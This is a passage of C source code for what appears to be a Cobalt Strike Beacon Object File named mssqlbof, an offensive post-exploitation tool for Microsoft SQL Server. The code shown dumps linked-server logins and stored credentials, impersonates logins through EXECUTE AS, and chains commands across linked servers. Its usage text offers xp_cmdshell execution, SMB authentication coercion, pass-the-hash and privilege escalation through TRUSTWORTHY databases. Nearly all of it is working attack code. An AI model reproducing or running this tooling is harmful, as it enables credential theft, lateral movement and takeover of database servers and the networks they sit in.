            BeaconPrintf(CALLBACK_ERROR, "[!] sysadmin required for credential dump");
            tds_close(c);
            return;
        }
        if (via[0] && via[0] != L'a') {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] privesc via: %ls", via);
            impersonating = 1;
        }
    }
    /* Linked-server login list */
    tds_result_t *r = NULL;
    rc = tds_query(c,
        L"SELECT s.name AS linked_server, l.remote_name "
        L"FROM sys.servers s "
        L"LEFT JOIN sys.linked_logins l ON s.server_id = l.server_id "
        L"WHERE s.is_linked = 1", &r);
    if (rc == TDS_OK && r) {
        BeaconPrintf(CALLBACK_OUTPUT, "Linked-server logins:");
        wchar_t ls[128], rn[128];
        int n = 0;
        while (tds_result_next_row(r) == 1) {
            tds_result_get_str(r, 0, ls, 128);
            tds_result_get_str(r, 1, rn, 128);
            BeaconPrintf(CALLBACK_OUTPUT, "  %ls -> %ls", ls,
                         rn[0] ? rn : L"(use_self=true)");
            ++n;
        }
        if (n == 0) BeaconPrintf(CALLBACK_OUTPUT, "  (no linked servers)");
    }
    if (r) tds_result_free(r);

    /* Credential objects visible via sys.credentials */
    r = NULL;
    rc = tds_query(c, L"SELECT name, credential_identity FROM sys.credentials", &r);
    if (rc == TDS_OK && r) {
        wchar_t nm[128], ident[128];
        int n = 0;
        while (tds_result_next_row(r) == 1) {
            if (n == 0) BeaconPrintf(CALLBACK_OUTPUT, "Server credentials:");
            tds_result_get_str(r, 0, nm, 128);
            tds_result_get_str(r, 1, ident, 128);
            BeaconPrintf(CALLBACK_OUTPUT, "  %ls -> identity=%ls", nm, ident);
            ++n;
        }
    }
    if (r) tds_result_free(r);
    if (impersonating) run_simple(c, L"REVERT;");
    tds_close(c);
}

/* ---- chain ---- run a command on a linked SQL server via EXEC AT */
static void action_chain(const char *host, int port, tds_auth_t *au,
                         const char *link_name, const char *sql,
                         const char *imp_method) {
    tds_conn_t *c = NULL;
    int rc = do_connect(host, port, au, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect failed (%d): %ls", rc, tds_last_error(c));
        if (c) tds_close(c);
        return;
    }
    wchar_t via[128] = {0};
    int impersonating = 0;
    if (!is_sysadmin(c)) {
        if (do_privesc(c, imp_method, via, 128) && via[0] && via[0] != L'a') {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] privesc via: %ls", via);
            impersonating = 1;
        }
    }
    /* Build: EXEC ('<sql>') AT [link] */
    wchar_t *q = (wchar_t*)MSVCRT$malloc(8192 * sizeof(wchar_t));
    if (!q) { tds_close(c); return; }
    size_t p = 0;
    const wchar_t *pfx = L"EXEC ('";
    while (*pfx && p < 8000) q[p++] = *pfx++;
    for (size_t i = 0; sql[i] && p < 8000; ++i) {
        if (sql[i] == '\'') q[p++] = L'\'';
        q[p++] = (wchar_t)(unsigned char)sql[i];
    }
    const wchar_t *mid = L"') AT [";
    while (*mid && p < 8000) q[p++] = *mid++;
    for (size_t i = 0; link_name[i] && p < 8000; ++i)
        q[p++] = (wchar_t)(unsigned char)link_name[i];
    q[p++] = L']'; q[p] = 0;
    tds_result_t *r = NULL;
    rc = tds_query(c, q, &r);
    MSVCRT$free(q);
    if (rc != TDS_OK || !r) {
        BeaconPrintf(CALLBACK_ERROR, "[!] chain query failed (%d): %ls", rc, tds_last_error(c));
        if (r) tds_result_free(r);
    } else {
        print_rows(r);
        tds_result_free(r);
    }
    if (impersonating) run_simple(c, L"REVERT;");
    tds_close(c);
}

/* ---- impersonate ---- */
static void action_impersonate(const char *host, int port, tds_auth_t *au,
                               int discover, const char *login, const char *user_sql) {
    tds_conn_t *c = NULL;
    int rc = do_connect(host, port, au, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect failed (%d): %ls", rc, tds_last_error(c));
        if (c) tds_close(c);
        return;
    }
    if (discover) {
        tds_result_t *r = NULL;
        rc = tds_query(c,
            L"SELECT DISTINCT b.name AS impersonatable_login "
            L"FROM sys.server_permissions a "
            L"JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
            L"WHERE a.permission_name = 'IMPERSONATE'", &r);
        if (rc == TDS_OK && r) {
            BeaconPrintf(CALLBACK_OUTPUT, "Impersonatable logins:");
            int n = 0;
            wchar_t name[128];
            while (tds_result_next_row(r) == 1) {
                tds_result_get_str(r, 0, name, 128);
                BeaconPrintf(CALLBACK_OUTPUT, "  - %ls", name);
                ++n;
            }
            if (n == 0) BeaconPrintf(CALLBACK_OUTPUT, "  (none)");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] discover failed (%d)", rc);
        }
        if (r) tds_result_free(r);
        tds_close(c);
        return;
    }
    if (!login || !user_sql) {
        BeaconPrintf(CALLBACK_ERROR, "[!] need --login and --sql");
        tds_close(c); return;
    }
    wchar_t *sql = (wchar_t*)MSVCRT$malloc(8192 * sizeof(wchar_t));
    if (!sql) { tds_close(c); return; }
    size_t pos = 0;
    const wchar_t *p = L"EXECUTE AS LOGIN = '";
    while (*p && pos < 8180) sql[pos++] = *p++;
    for (size_t i = 0; login[i] && pos < 8180; ++i) {
        if (login[i] == '\'') sql[pos++] = L'\'';
        sql[pos++] = (wchar_t)(unsigned char)login[i];
    }
    sql[pos++] = L'\''; sql[pos++] = L';'; sql[pos++] = L' ';
    for (size_t i = 0; user_sql[i] && pos < 8180; ++i)
        sql[pos++] = (wchar_t)(unsigned char)user_sql[i];
    const wchar_t *r2 = L"; REVERT;";
    for (int i = 0; r2[i] && pos < 8190; ++i) sql[pos++] = r2[i];
    sql[pos] = 0;
    tds_result_t *r = NULL;
    rc = tds_query(c, sql, &r);
    MSVCRT$free(sql);
    if (rc != TDS_OK || !r) {
        BeaconPrintf(CALLBACK_ERROR, "[!] impersonate failed (%d): %ls", rc, tds_last_error(c));
        if (r) tds_result_free(r);
        tds_close(c);
        return;
    }
    print_rows(r);
    tds_result_free(r);
    tds_close(c);
}

/* ---- dispatch ---- */
void go(char *args, int alen) {
    bof_args_t a;
    bof_args_init(&a, args, alen);
    const char *action = bof_args_str_flag(&a, "--action", NULL);
    if (!action) {
        BeaconPrintf(CALLBACK_ERROR,
            "mssqlbof v0.1.2 by 0xmaz\n"
            "\n"
            "usage: mssql --action <verb> [--host H] [--port N] [auth] [args]\n"
            "\n"
            "Actions:\n"
            "  find                                    LDAP enum of MSSQLSvc SPNs\n"
            "  info         --host H                   server/version/user/sysadmin/db\n"
            "  query        --host H --sql \"...\"       arbitrary T-SQL\n"
            "  links        --host H                   linked-server enumeration\n"
            "  exec         --host H --cmd \"...\"       xp_cmdshell (auto enable+restore)\n"
            "                                          [--no-restore]\n"
            "                                          [--impersonate auto|login|trustworthy|none]\n"
            "  impersonate  --host H --discover        list logins you can EXECUTE AS\n"
            "  impersonate  --host H --login L --sql \"...\"\n"
            "                                          run T-SQL as L via EXECUTE AS LOGIN\n"
            "  privesc      --host H                   enumerate privesc surface\n"
            "  coerce       --host H --to \"\\\\\\\\lis\\\\x\"  xp_dirtree SMB auth coercion\n"
            "  passwords    --host H                   dump linked_logins + sys.credentials\n"
            "  chain        --host H --via LINK --sql \"...\"\n"
            "                                          EXEC (...) AT [LinkedServer]\n"
            "\n"
            "Auth modes (default: sspi):\n"
            "  --auth sspi                             current beacon thread token\n"
            "                                          (Kerberos or NTLM, honors make_token)\n"
            "  --auth ntlm --domain D --user U --pass P\n"
            "                                          explicit NTLM plaintext\n"
            "  --auth ntlm --domain D --user U --hash <NT>\n"
            "                                          pass-the-hash (manual NTLMv2)\n"
            "  --auth sql  --user U --pass P           SQL authentication\n"
            "\n"
            "--hash takes a 32-char hex NT hash or the LM:NT form secretsdump emits.\n"
            "The PTH path rolls NTLMv2 by hand via BCrypt; no SSPI, no lsass.\n"
            "\n"
            "Privesc methods for --action exec:\n"
            "  auto         (default) try EXECUTE AS LOGIN, then TRUSTWORTHY hop\n"
            "  login        EXECUTE AS LOGIN via an IMPERSONATE grant\n"
            "  trustworthy  hop through dbo of a sysadmin-owned TRUSTWORTHY db\n"
            "  none         fail if not sysadmin (no privesc attempt)");
        return;
    }
    const char *host = bof_args_str_flag(&a, "--host", NULL);
    int port = bof_args_int_flag(&a, "--port", 1433);
    int no_restore = bof_args_bool_flag(&a, "--no-restore");
    int discover = bof_args_bool_flag(&a, "--discover");
    const char *sql = bof_args_str_flag_tail(&a, "--sql", NULL);
    const char *cmd = bof_args_str_flag_tail(&a, "--cmd", NULL);
    const char *login = bof_args_str_flag(&a, "--login", NULL);
    const char *imp_method = bof_args_str_flag(&a, "--impersonate", "auto");

    wchar_t wu[128], wp[128], wd[64];
    tds_auth_t au = {0};
    build_auth(&a, &au, wu, wp, wd);

    if (str_eq(action, "find")) {
        action_find(0);
    } else if (str_eq(action, "info")) {
        if (!host) { BeaconPrintf(CALLBACK_ERROR, "[!] --host required"); return; }
        action_info(host, port, &au);
    } else if (str_eq(action, "query")) {
        if (!host || !sql) { BeaconPrintf(CALLBACK_ERROR, "[!] --host and --sql required"); return; }
        action_query(host, port, &au, sql);
    } else if (str_eq(action, "links")) {
        if (!host) { BeaconPrintf(CALLBACK_ERROR, "[!] --host required"); return; }
        action_links(host, port, &au);
    } else if (str_eq(action, "exec")) {
        if (!host || !cmd) { BeaconPrintf(CALLBACK_ERROR, "[!] --host and --cmd required"); return; }
        action_exec(host, port, &au, cmd, no_restore, imp_method);
    } else if (str_eq(action, "impersonate")) {
        if (!host) { BeaconPrintf(CALLBACK_ERROR, "[!] --host required"); return; }
        action_impersonate(host, port, &au, discover, login, sql);
    } else if (str_eq(action, "coerce")) {
        const char *to = bof_args_str_flag(&a, "--to", NULL);
        if (!host || !to) { BeaconPrintf(CALLBACK_ERROR, "[!] --host and --to required"); return; }
        action_coerce(host, port, &au, to, imp_method);
    } else if (str_eq(action, "passwords")) {
        if (!host) { BeaconPrintf(CALLBACK_ERROR, "[!] --host required"); return; }
        action_passwords(host, port, &au, imp_method);
    } else if (str_eq(action, "privesc")) {
        if (!host) { BeaconPrintf(CALLBACK_ERROR, "[!] --host required"); return; }
        action_privesc_enum(host, port, &au);
    } else if (str_eq(action, "chain")) {
        const char *via_link = bof_args_str_flag(&a, "--via", NULL);
        if (!host || !via_link || !sql) {
            BeaconPrintf(CALLBACK_ERROR, "[!] --host, --via, --sql required");
            return;
        }
        action_chain(host, port, &au, via_link, sql, imp_method);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] unknown --action: %s", action);
    }
}
